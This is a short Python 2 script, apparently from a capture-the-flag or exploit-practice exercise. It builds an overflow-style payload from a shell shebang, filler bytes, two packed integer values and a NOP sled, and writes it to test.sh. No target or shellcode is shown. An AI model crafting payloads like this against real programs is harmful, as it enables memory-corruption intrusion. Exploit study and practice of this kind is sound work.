import struct
import os
def main():
	
	payload = "#!/bin/sh"+"C"*3+"D"*4+"E"*4+"F"*4+"G"*4+"\x20\x00\x00\x00"+"Z"*12+"\xb8\x2e\x00\x00"+"\x90"*71
	print hex(len(payload))
	fp = open("test.sh","wb")
	fp.write(payload)
	fp.close()
	pass
main()
